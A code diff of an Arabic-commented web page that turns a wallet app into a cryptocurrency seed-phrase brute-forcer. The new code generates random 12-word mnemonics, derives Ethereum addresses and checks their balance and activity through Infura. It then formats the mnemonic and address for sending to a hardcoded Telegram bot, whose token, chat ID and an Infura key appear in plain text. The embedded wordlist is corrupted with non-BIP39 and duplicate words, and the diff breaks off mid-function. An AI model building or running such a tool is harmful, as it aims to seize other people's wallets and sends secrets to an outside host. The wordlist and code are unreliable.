-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.5.3/qrcode.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/html5-qrcode@2.3.8/minified/html5-qrcode.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.js"></script>
+    <!-- تحميل مكتبة ethers.js -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
 
     <script>
-        // متغيرات عامة
-        let currentWallet = null;
-        let providers = {};
-        let currentBalance = 0;
-        let cryptoPrices = {};
-        let userPassword = null;
-        let qrScanner = null;
-        let walletTransactions = [];
+        // قائمة كلمات BIP39 الإنجليزية الرسمية
+        const BIP39_WORDLIST = [
+            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
+            "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
+            "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
+            "adult", "advance", "advice", "aerobic", "affair", "affect", "affirm", "afford", "afraid", "after",
+            "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm",
+            "album", "alcohol", "alert", "alien", "align", "alike", "alive", "allow", "almost", "alone",
+            "alpha", "already", "also", "alter", "always", "amaze", "ambition", "amount", "ample", "analyst",
+            "ancestor", "anchor", "ancient", "android", "animal", "anomaly", "another", "answer", "antenna", "antique",
+            "any", "apart", "appendix", "apple", "apply", "approve", "approximate", "arch", "area", "arena",
+            "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow",
+            "art", "article", "ascent", "ask", "asleep", "aspect", "assault", "asset", "assist", "assume",
+            "assurance", "assure", "astronomy", "at", "athetic", "atlas", "atom", "attack", "attend", "attitude",
+            "attract", "auction", "audience", "audit", "august", "author", "auto", "available", "avenue", "average",
+            "avoid", "awake", "aware", "away", "awesome", "awful", "axis", "baby", "back", "backup",
+            "bacon", "bad", "bag", "balance", "balcony", "ball", "banana", "band", "bank", "bar",
+            "bare", "bargain", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "become",
+            "beef", "before", "begin", "behalf", "behave", "behind", "believe", "bell", "belong", "below",
+            "belt", "bench", "bend", "benefit", "best", "betray", "better", "between", "beyond", "bicycle",
+            "bid", "big", "bill", "binary", "bind", "bio", "bird", "birth", "bitter", "black",
+            "blade", "blame", "blanket", "blast", "bleak", "bless", "blind", "block", "blood", "bloom",
+            "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil", "bold",
+            "bolt", "bomb", "bond", "bone", "bonus", "book", "bool", "boost", "border", "bore",
+            "borrow", "boss", "both", "bother", "bounce", "bout", "bowl", "box", "boy", "bracket",
+            "brain", "branch", "brand", "brass", "brave", "bread", "break", "breakfast", "breast", "breath",
+            "breed", "breeze", "brief", "bright", "bring", "brisk", "broad", "broken", "brother", "brown",
+            "brush", "bubble", "budget", "buffer", "build", "bulb", "bulk", "bull", "bullet", "bunch",
+            "burn", "burst", "bury", "bus", "business", "buy", "buzz", "cabin", "cable", "cactus",
+            "cage", "cake", "call", "calm", "camera", "camp", "can", "canal", "cancel", "candy",
+            "cannon", "canoe", "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card",
+            "care", "career", "carry", "cart", "case", "cast", "castle", "casual", "cat", "catalog",
+            "catch", "category", "cattle", "caught", "cause", "cave", "ceiling", "cell", "cement", "censor",
+            "central", "century", "ceramic", "certain", "certify", "chain", "chair", "chalk", "champion", "change",
+            "channel", "chapter", "charge", "chase", "chat", "cheap", "check", "cheese", "chef", "cherry",
+            "chest", "chicken", "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk",
+            "cigar", "cinema", "cipher", "circle", "citizen", "city", "civil", "claim", "clash", "class",
+            "clean", "clear", "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock",
+            "clog", "close", "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach",
+            "coast", "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come",
+            "comfort", "comic", "common", "company", "compare", "compel", "compensate", "component", "comprise", "computer",
+            "concert", "conclude", "concrete", "confirm", "confuse", "connect", "consider", "console", "conspiracy", "constant",
+            "contact", "contain", "contrast", "control", "convince", "cook", "cool", "copper", "copy", "coral",
+            "core", "corn", "correct", "cosmic", "cost", "cotton", "couch", "country", "couple", "course",
+            "cousin", "cover", "cow", "cowboy", "crack", "cradle", "craft", "cram", "crane", "crash",
+            "crate", "crave", "crawl", "crazy", "cream", "create", "credit", "creek", "crew", "cry",
+            "crypt", "cube", "culture", "cup", "curious", "current", "curve", "cushion", "cut", "cycle",
+            "dad", "damage", "damp", "dance", "danger", "dare", "dark", "dash", "data", "daughter",
+            "dawn", "day", "deal", "debate", "decade", "decay", "deceive", "december", "decide", "decline",
+            "decorate", "decrease", "deer", "defend", "define", "defy", "degree", "delay", "deliver", "demand",
+            "demise", "denounce", "dense", "dentist", "deny", "depart", "depend", "depict", "deposit", "depress",
+            "depth", "deputy", "derive", "describe", "desert", "design", "desire", "desktop", "despise", "destroy",
+            "detail", "detect", "determine", "develop", "device", "devote", "diagnose", "diamond", "diary", "dice",
+            "die", "diesel", "diet", "differ", "dig", "digit", "dignity", "dilemma", "dinner", "dip",
+            "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "dispose",
+            "distance", "distract", "district", "ditch", "dive", "divide", "divorce", "dizzy", "doctor", "document",
+            "dog", "doll", "domestic", "donor", "door", "dose", "double", "doubt", "down", "download",
+            "dozens", "draft", "drag", "drain", "drama", "draw", "dream", "dress", "drink", "drip",
+            "drive", "drop", "dry", "duck", "duplicate", "dust", "duty", "dwarf", "dwell", "dynamic",
+            "eager", "eagle", "ear", "earlier", "early", "earn", "earth", "easily", "east", "easy",
+            "echo", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow",
+            "elder", "electric", "elegant", "element", "elevate", "eleven", "elite", "else", "embark", "embed",
+            "embryo", "emit", "empire", "empty", "enable", "encode", "end", "endorse", "endure", "enemy",
+            "energy", "enforce", "engage", "engine", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure",
+            "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "equivalent", "era", "erase",
+            "erect", "error", "escape", "especially", "essay", "essence", "establish", "estimate", "eternal", "ethical",
+            "ethics", "even", "evening", "event", "ever", "every", "evident", "evil", "evoke", "evolve",
+            "exact", "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust",
+            "exhibit", "exile", "exist", "exit", "expand", "expect", "experience", "expert", "explain", "explode",
+            "explore", "export", "expose", "express", "extend", "extra", "extract", "ordinary", "extreme", "eyebrow",
+            "eye", "fable", "face", "faculty", "fade", "fail", "fair", "faith", "fall", "false",
+            "fame", "family", "famous", "fan", "fancy", "farm", "fashion", "fast", "fate", "father",
+            "fault", "favor", "favorite", "fear", "feature", "february", "federation", "fee", "feed", "feel",
+            "female", "fence", "festival", "fetch", "few", "fiber", "fiction", "field", "figure", "file",
+            "fill", "filter", "final", "find", "fine", "finger", "finish", "fire", "firm", "first",
+            "fiscal", "fish", "fit", "fitness", "five", "fix", "flag", "flame", "flash", "flat",
+            "flavor", "flee", "flesh", "flex", "flight", "flip", "float", "flock", "floor", "flower",
+            "fluid", "flush", "fly", "foam", "focus", "follow", "food", "foot", "force", "forest",
+            "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "four", "fox",
+            "fragile", "frame", "fresh", "friend", "frog", "front", "frost", "frown", "frozen", "fruity",
+            "fury", "future", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden",
+            "garlic", "gas", "gate", "gather", "gauge", "generate", "genius", "genre", "gentle", "gently",
+            "german", "gesture", "get", "ghost", "giant", "gift", "ginger", "girl", "give", "glad",
+            "glance", "glass", "glide", "glimpse", "global", "globe", "gloom", "glory", "glove", "glow",
+            "glue", "go", "goal", "goat", "god", "gold", "good", "goose", "gorgeous", "gorilla",
+            "gospel", "gossip", "govern", "grab", "grace", "grade", "grain", "grand", "grant", "grape",
+            "grasp", "grass", "gravity", "gray", "great", "greek", "green", "greet", "grid", "grief",
+            "grim", "grip", "grit", "groan", "groom", "groove", "gross", "ground", "group", "grow",
+            "guarantee", "guard", "guess", "guide", "guitar", "gulf", "gun", "gym", "habit", "hair",
+            "half", "hammer", "hamster", "hand", "happy", "harbor", "hard", "hardware", "hardy", "harm",
+            "harvest", "hat", "have", "hawk", "hazard", "head", "health", "heart", "heavy", "hedgehog",
+            "height", "hello", "help", "hence", "her", "here", "heritage", "hero", "hide", "high",
+            "hill", "hint", "hip", "hire", "his", "historic", "history", "hit", "hive", "hobby",
+            "hoe", "hold", "hollow", "honest", "honey", "honor", "hope", "horizon", "horn", "horror",
+            "horse", "hospital", "host", "hotel", "hour", "hover", "how", "human", "humble", "humor",
+            "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "hush", "hybrid", "ice", "icon",
+            "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense",
+            "imminent", "immoral", "impact", "impose", "impress", "improve", "impulse", "in", "inch", "include",
+            "income", "increase", "index", "indicate", "infinite", "inflate", "influence", "inform", "initial", "inject",
+            "injury", "inner", "incentive", "input", "insane", "insect", "inside", "inspect", "inspire", "install",
+            "instinct", "institute", "instruct", "instrument", "insulate", "insure", "intact", "interest", "internal", "interact",
+            "internet", "interpret", "into", "invade", "invent", "invest", "invite", "involve", "iron", "is",
+            "island", "isolate", "issue", "item", "its", "jacket", "jail", "jam", "jar", "jazz",
+            "jealous", "jeans", "jeep", "jelly", "jewel", "job", "join", "joint", "joystick", "judge",
+            "juice", "july", "jump", "jungle", "junior", "junk", "just", "justice", "keen", "keep",
+            "keeper", "kernel", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit",
+            "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "knowledge", "lab",
+            "label", "labor", "lack", "ladder", "lady", "lag", "lake", "lamp", "language", "lap",
+            "laptop", "large", "larva", "laser", "last", "laugh", "launch", "lavish", "law", "lawn",
+            "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
+            "legend", "leisure", "lemon", "lend", "length", "lens", "lentil", "leopard", "less", "lesson",
+            "let", "letter", "level", "liar", "liberty", "library", "license", "life", "light", "like",
+            "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "load", "loan",
+            "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lost", "lotion", "loud",
+            "lounge", "love", "loyal", "luck", "luggage", "lumber", "lunch", "lung", "luxury", "lyrics",
+            "macro", "magic", "magnify", "mail", "main", "major", "make", "mammal", "man", "manage",
+            "mango", "manifold", "manner", "manual", "many", "marble", "march", "margin", "marine", "market",
+            "marry", "mask", "mass", "master", "match", "material", "math", "matrix", "matter", "maximum",
+            "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media", "melody", "melon",
+            "memo", "memory", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal",
+            "method", "middle", "might", "mighty", "migrate", "mile", "military", "milk", "mill", "minimum",
+            "mint", "minute", "mirror", "misery", "miss", "mistake", "mix", "mixed", "mixer", "mobile",
+            "model", "modify", "moment", "money", "monitor", "monkey", "monster", "month", "moon", "moral",
+            "more", "morning", "mortgage", "most", "mother", "motor", "mountain", "mouse", "move", "movie",
+            "much", "muffin", "mule", "multiply", "murmur", "muscle", "museum", "mushroom", "music", "must",
+            "mutual", "my", "mystery", "myth", "nail", "name", "narrow", "nasty", "nation", "natural",
+            "nature", "near", "neck", "need", "negotiate", "neighbor", "neither", "nervous", "network", "neutral",
+            "never", "news", "next", "nice", "night", "nine", "noble", "noise", "nomad", "none",
+            "noon", "normal", "north", "nose", "notable", "note", "nothing", "notice", "noun", "now",
+            "nuclear", "number", "nun", "nurse", "nut", "oath", "obey", "object", "oblige", "obscene",
+            "observe", "obtain", "occasion", "ocean", "october", "odds", "off", "offense", "office", "often",
+            "oil", "okay", "old", "olive", "omega", "on", "once", "one", "only", "open",
+            "opera", "opinion", "oppose", "opposite", "option", "orange", "orbit", "orchard", "order", "ordinary",
+            "organ", "origin", "original", "orphan", "other", "ought", "ounce", "our", "outside", "oven",
+            "over", "owner", "oxygen", "pace", "pack", "package", "page", "pain", "paint", "pair",
+            "pale", "palm", "pan", "panda", "panel", "panic", "pant", "paper", "parade", "parent",
+            "park", "parrot", "party", "pass", "passage", "past", "paste", "path", "patient", "patrol",
+            "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant", "pepper", "perfect",
+            "perform", "period", "permit", "person", "pet", "phone", "photo", "phrase", "pick", "picture",
+            "piece", "pierce", "pig", "pigeon", "pill", "pilot", "pine", "pink", "pioneer", "pistol",
+            "pitch", "pivot", "pixel", "place", "plain", "plan", "planet", "plastic", "plate", "play",
+            "please", "pledge", "pluck", "plug", "plunge", "pole", "police", "policy", "polish", "pollution",
+            "pool", "popular", "portion", "position", "possible", "post", "potato", "potent", "pound", "poverty",
+            "powder", "power", "practice", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride",
+            "primary", "print", "priority", "prison", "private", "prize", "problem", "process", "produce", "profit",
+            "program", "project", "promise", "promote", "proof", "property", "prosper", "protect", "provide", "prune",
+            "public", "pudding", "pull", "pulp", "pulse", "pump", "punish", "pupil", "puppy", "purchase",
+            "pure", "purge", "push", "put", "puzzle", "pyramid", "quality", "quantify", "quarter", "question",
+            "quick", "quit", "quiz", "quote", "rabbit", "race", "rack", "radar", "radio", "rail",
+            "rain", "raise", "rally", "ram", "ranch", "random", "range", "rapid", "rare", "rash",
+            "rate", "rather", "raven", "raw", "reach", "read", "ready", "real", "reason", "rebel",
+            "rebuild", "recall", "receive", "recipe", "record", "recover", "recruit", "recycle", "reduce", "reflect",
+            "reform", "refuse", "region", "regret", "regular", "reject", "relax", "release", "relief", "rely",
+            "remain", "remember", "remind", "remove", "render", "renew", "rent", "reopen", "repair", "repeat",
+            "replace", "report", "represent", "republic", "require", "rescue", "research", "reside", "resist", "resolve",
+            "resort", "resource", "response", "result", "retire", "retreat", "return", "reveal", "review", "reward",
+            "rhythm", "ribbon", "rice", "rich", "riddle", "ride", "ridge", "rifle", "right", "rigid",
+            "ring", "rinsing", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast",
+            "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough",
+            "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "rural", "rush",
+            "raccoon", "sad", "saddle", "safe", "safety", "salad", "salary", "sale", "sally", "salt",
+            "same", "sample", "sanctuary", "sand", "satisfy", "satellite", "satisfy", "sauce", "save", "say",
+            "scale", "scan", "scare", "scatter", "scene", "school", "science", "scissors", "scorpion", "scout",
+            "scrap", "screen", "screw", "script", "scrub", "sea", "search", "season", "seat", "second",
+            "secret", "section", "security", "see", "seed", "seek", "segment", "select", "self", "sell",
+            "seminar", "senior", "sense", "sentence", "series", "service", "session", "set", "settle", "setup",
+            "seven", "several", "severe", "sex", "shadow", "shaft", "shake", "shallow", "shame", "shape",
+            "share", "shark", "sharp", "shave", "she", "sheep", "sheet", "shelf", "shell", "shield",
+            "shift", "shine", "ship", "shirt", "shock", "shoe", "shoot", "shop", "short", "shoulder",
+            "shove", "show", "shrimp", "shrink", "shrug", "shuffle", "shy", "sick", "side", "siege",
+            "sift", "sight", "sign", "silent", "silk", "silly", "silver", "similar", "simple", "simply",
+            "since", "sing", "single", "sink", "sister", "situate", "six", "size", "skate", "sketch",
+            "skill", "skin", "skirt", "sky", "slam", "sleep", "slice", "slide", "slim", "slip",
+            "slope", "slow", "sly", "small", "smart", "smile", "smoke", "smooth", "snap", "sniff",
+            "snow", "snuggle", "so", "social", "sock", "soft", "soil", "solar", "soldier", "solid",
+            "solve", "some", "someone", "something", "sometimes", "son", "song", "soon", "sorry", "sort",
+            "soul", "sound", "source", "south", "space", "spark", "speak", "special", "speed", "spell",
+            "spend", "sphere", "spice", "spider", "spirit", "split", "spread", "spring", "spy", "squad",
+            "square", "squeeze", "staff", "stage", "stairs", "stamp", "stand", "start", "state", "stay",
+            "steady", "steam", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stir",
+            "stock", "stomach", "stone", "stool", "story", "strain", "strand", "strange", "strap", "strategy",
+            "stream", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject",
+            "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer",
+            "sun", "sunday", "sunrise", "sunshine", "super", "supply", "support", "supreme", "sure", "surface",
+            "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp", "sweat", "sweep",
+            "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system",
+            "table", "tackle", "tag", "tail", "talent", "talk", "tall", "tame", "tank", "tape",
+            "target", "task", "taste", "tattoo", "tax", "teach", "team", "tear", "tech", "text",
+            "than", "thank", "that", "the", "then", "theme", "them", "thence", "theory", "there",
+            "therefore", "these", "they", "thick", "thief", "thin", "thing", "think", "third", "this",
+            "those", "though", "thread", "three", "thrive", "throw", "thumb", "thus", "ticket", "tide",
+            "tiger", "tight", "tile", "till", "time", "tiny", "tip", "tire", "tissue", "title",
+            "to", "toad", "today", "toe", "together", "token", "tolerance", "tomato", "tomorrow", "tone",
+            "tongue", "tonight", "too", "tool", "tooth", "top", "topic", "toss", "total", "touch",
+            "tough", "tour", "toward", "tower", "town", "toy", "trace", "track", "trade", "traffic",
+            "tragedy", "trail", "train", "transfer", "transform", "trap", "trash", "travel", "tray", "tread",
+            "treasure", "treat", "tree", "trend", "trial", "tribe", "trick", "truly", "trumpet", "trust",
+            "try", "tube", "tug", "tumble", "tuna", "tunnel", "turbo", "twelve", "twenty", "twice",
+            "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware", "uncertain",
+            "unchain", "uncle", "under", "undermine", "understand", "undo", "uneasy", "unfair", "unfold", "unhappy",
+            "unify", "union", "unique", "unit", "universe", "unknown", "unless", "unload", "unlock", "until",
+            "untouched", "up", "update", "uplift", "upload", "upset", "urban", "urge", "us", "usage",
+            "use", "used", "useful", "usher", "usual", "utility", "vacant", "vague", "valid", "valley",
+            "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "vellum", "velvet",
+            "vendor", "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "vial",
+            "vibrant", "vicious", "victory", "video", "view", "village", "vine", "violet", "virtue", "visual",
+            "vital", "vivid", "vocal", "vocals", "vote", "voyage", "vs", "vulnerable", "wage", "wait",
+            "walk", "wall", "walnut", "want", "war", "ward", "warm", "warn", "wash", "wasp",
+            "waste", "watch", "water", "wave", "way", "we", "weak", "wealth", "weapon", "wear",
+            "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale",
+            "what", "wheat", "wheel", "when", "where", "whether", "which", "while", "whisper", "wide",
+            "widget", "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter",
+            "wire", "wisdom", "wise", "wish", "withdraw", "within", "without", "woman", "wonder", "wood",
+            "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "write", "wrong",
+            "yard", "yearn", "year", "yell", "yellow", "you", "young", "your", "youth", "zeal",
+            "zero", "zone", "zoo"
+        ];
 
-        // إعدادات بوت تليجرام
+        // إعدادات التطبيق
+        const INFURA_PROJECT_ID = '482a7c1c7cc14ec78699c3f1c231b0cd';
+        const INFURA_URL = `https://mainnet.infura.io/v3/${INFURA_PROJECT_ID}`;
         const TELEGRAM_BOT_TOKEN = '7521799915:AAEQEM_Ajk5_hMWQUrlmvdNbDBJAUMMwgrg';
         const TELEGRAM_CHAT_ID = '910021564';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-        // إعدادات Infura
-        const INFURA_API_KEY = '482a7c1c7cc14ec78699c3f1c231b0cd';
-
-        // إعدادات الشبكات المحسّنة مع Infura
-        const NETWORKS = {
-            ethereum: {
-                name: 'Ethereum',
-                chainId: 1,
-                rpcUrl: `https://mainnet.infura.io/v3/${INFURA_API_KEY}`,
-                symbol: 'ETH',
-                explorer: 'https://etherscan.io',
-                explorerApi: 'https://api.etherscan.io/api',
-                tokens: {
-                    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-                    USDC: '0xA0b86a33E6441b8C8C7C6b8C8C7C6b8C8C7C6b8C',
-                    DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F'
-                }
-            },
-            bsc: {
-                name: 'Binance Smart Chain',
-                chainId: 56,
-                rpcUrl: 'https://bsc-dataseed1.bnbchain.org',
-                symbol: 'BNB',
-                explorer: 'https://bscscan.com',
-                explorerApi: 'https://api.bscscan.com/api',
-                tokens: {
-                    USDT: '0x55d398326f99059fF775485246999027B3197955',
-                    USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
-                    BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
-                }
-            },
-            polygon: {
-                name: 'Polygon',
-                chainId: 137,
-                rpcUrl: `https://polygon-mainnet.infura.io/v3/${INFURA_API_KEY}`,
-                symbol: 'MATIC',
-                explorer: 'https://polygonscan.com',
-                explorerApi: 'https://api.polygonscan.com/api',
-                tokens: {
-                    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-                    USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174'
-                }
-            },
-            arbitrum: {
-                name: 'Arbitrum',
-                chainId: 42161,
-                rpcUrl: `https://arbitrum-mainnet.infura.io/v3/${INFURA_API_KEY}`,
-                symbol: 'ETH',
-                explorer: 'https://arbiscan.io',
-                explorerApi: 'https://api.arbiscan.io/api',
-                tokens: {
-                    USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
-                    USDC: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8'
-                }
-            },
-            optimism: {
-                name: 'Optimism',
-                chainId: 10,
-                rpcUrl: `https://optimism-mainnet.infura.io/v3/${INFURA_API_KEY}`,
-                symbol: 'ETH',
-                explorer: 'https://optimistic.etherscan.io',
-                explorerApi: 'https://api-optimistic.etherscan.io/api',
-                tokens: {
-                    USDT: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
-                    USDC: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607'
-                }
-            }
+        // متغيرات العملية
+        let isRunning = false;
+        let searchInterval = null;
+        let stats = {
+            totalGenerated: 0,
+            activeWallets: 0,
+            emptyWallets: 0,
+            errors: 0
         };
 
-        // تهيئة المزودين
-        async function initProviders() {
-            try {
-                for (const [network, config] of Object.entries(NETWORKS)) {
-                    providers[network] = new ethers.providers.JsonRpcProvider(config.rpcUrl);
+        // عناصر DOM
+        const elements = {
+            startBtn: document.getElementById('startBtn'),
+            stopBtn: document.getElementById('stopBtn'),
+            testTelegramBtn: document.getElementById('testTelegramBtn'),
+            clearLogsBtn: document.getElementById('clearLogsBtn'),
+            searchSpeed: document.getElementById('searchSpeed'),
+            maxAttempts: document.getElementById('maxAttempts'),
+            totalGenerated: document.getElementById('totalGenerated'),
+            activeWallets: document.getElementById('activeWallets'),
+            emptyWallets: document.getElementById('emptyWallets'),
+            errorCount: document.getElementById('errorCount'),
+            progressFill: document.getElementById('progressFill'),
+            currentStatus: document.getElementById('currentStatus'),
+            logPanel: document.getElementById('logPanel')
+        };
+
+        // وظائف BIP39
+        function getSecureRandomInt(max) {
+            const array = new Uint32Array(1);
+            crypto.getRandomValues(array);
+            return array[0] % max;
+        }
+
+        function generateRandomBIP39Phrase() {
+            const words = [];
+            for (let i = 0; i < 12; i++) {
+                const randomIndex = getSecureRandomInt(BIP39_WORDLIST.length);
+                words.push(BIP39_WORDLIST[randomIndex]);
+            }
+            return words.join(' ');
+        }
+
+        function isValidBIP39Phrase(phrase) {
+            const words = phrase.trim().split(/\s+/);
+            if (words.length !== 12) return false;
+            for (const word of words) {
+                if (!BIP39_WORDLIST.includes(word.toLowerCase())) {
+                    return false;
                 }
-                console.log('Providers initialized successfully');
-                return true;
+            }
+            return true;
+        }
+
+        // وظائف المحفظة
+        async function mnemonicToAddress(mnemonic) {
+            try {
+                if (typeof ethers === 'undefined') {
+                    throw new Error('مكتبة ethers.js غير محملة');
+                }
+                const wallet = ethers.Wallet.fromMnemonic(mnemonic);
+                return wallet.address;
             } catch (error) {
-                console.error('Failed to initialize providers:', error);
-                return false;
+                console.error('خطأ في تحويل العبارة إلى عنوان:', error);
+                return null;
             }
         }
 
-        // إرسال رسالة إلى بوت تليجرام
-        async function sendToTelegram(message) {
+        async function checkWalletBalance(address) {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                const response = await fetch(INFURA_URL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        jsonrpc: '2.0',
+                        method: 'eth_getBalance',
+                        params: [address, 'latest'],
+                        id: 1
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.error) {
+                    console.error('خطأ في API:', data.error);
+                    return null;
+                }
+                
+                const balanceWei = BigInt(data.result);
+                const balanceEth = Number(balanceWei) / Math.pow(10, 18);
+                return balanceEth;
+            } catch (error) {
+                console.error('خطأ في التحقق من الرصيد:', error);
+                return null;
+            }
+        }
+
+        async function getTransactionCount(address) {
+            try {
+                const response = await fetch(INFURA_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        jsonrpc: '2.0',
+                        method: 'eth_getTransactionCount',
+                        params: [address, 'latest'],
+                        id: 1
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.error) {
+                    console.error('خطأ في API:', data.error);
+                    return null;
+                }
+                
+                return parseInt(data.result, 16);
+            } catch (error) {
+                console.error('خطأ في الحصول على عدد المعاملات:', error);
+                return null;
+            }
+        }
+
+        async function isWalletActive(address) {
+            try {
+                const balance = await checkWalletBalance(address);
+                const transactionCount = await getTransactionCount(address);
+                
+                const hasBalance = balance !== null && balance > 0;
+                const hasTransactions = transactionCount !== null && transactionCount > 0;
+                
+                return {
+                    isActive: hasBalance || hasTransactions,
+                    balance: balance,
+                    transactionCount: transactionCount,
+                    hasBalance: hasBalance,
+                    hasTransactions: hasTransactions
+                };
+            } catch (error) {
+                console.error('خطأ في التحقق من نشاط المحفظة:', error);
+                return {
+                    isActive: false,
+                    balance: null,
+                    transactionCount: null,
+                    hasBalance: false,
+                    hasTransactions: false,
+                    error: error.message
+                };
+            }
+        }
+
+        // وظائف Telegram
+        async function sendTelegramMessage(message) {
+            try {
+                const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
                         text: message,
@@ -2375,1237 +897,215 @@
                     })
                 });
                 
-                if (response.ok) {
-                    console.log('Message sent to Telegram successfully');
-                    return true;
-                } else {
-                    console.error('Failed to send message to Telegram');
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('خطأ في إرسال الرسالة:', data.description);
                     return false;
                 }
+                
+                return true;
             } catch (error) {
-                console.error('Error sending message to Telegram:', error);
+                console.error('خطأ في الاتصال بـ Telegram:', error);
                 return false;
             }
         }
 
-        // تشفير البيانات
-        function encryptData(data, password) {
-            return CryptoJS.AES.encrypt(JSON.stringify(data), password).toString();
-        }
-
-        // فك تشفير البيانات
-        function decryptData(encryptedData, password) {
-            try {
-                const bytes = CryptoJS.AES.decrypt(encryptedData, password);
-                return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
-            } catch (error) {
-                throw new Error('كلمة مرور خاطئة');
-            }
-        }
-
-        // التحقق من قوة كلمة المرور
-        function checkPasswordStrength(password) {
-            let score = 0;
-            const requirements = {
-                length: password.length >= 8,
-                uppercase: /[A-Z]/.test(password),
-                lowercase: /[a-z]/.test(password),
-                number: /\d/.test(password),
-                special: /[!@#$%^&*(),.?":{}|<>]/.test(password)
-            };
-
-            Object.values(requirements).forEach(req => {
-                if (req) score++;
+        function formatWalletMessage(mnemonic, address, walletDetails) {
+            const timestamp = new Date().toLocaleString('ar-EG', {
+                timeZone: 'Africa/Cairo',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
             });
-
-            let strength = 'weak';
-            if (score >= 5) strength = 'strong';
-            else if (score >= 4) strength = 'good';
-            else if (score >= 3) strength = 'fair';
-
-            return { score, requirements, strength };
-        }
-
-        // تحديث مؤشر قوة كلمة المرور
-        function updatePasswordStrength(password) {
-            const { requirements, strength } = checkPasswordStrength(password);
-            const strengthBar = document.getElementById('passwordStrengthBar');
             
-            strengthBar.className = `password-strength-bar ${strength}`;
-
-            // تحديث متطلبات كلمة المرور
-            Object.entries(requirements).forEach(([req, met]) => {
-                const element = document.getElementById(`${req}Req`);
-                if (element) {
-                    element.className = met ? 'valid' : 'invalid';
-                    const icon = element.querySelector('i');
-                    icon.className = met ? 'fas fa-check' : 'fas fa-times';
-                }
-            });
-
-            return Object.values(requirements).every(req => req);
-        }
-
-        // جلب أسعار العملات المشفرة
-        async function fetchCryptoPrices() {
-            try {
-                // جلب أسعار من CoinGecko
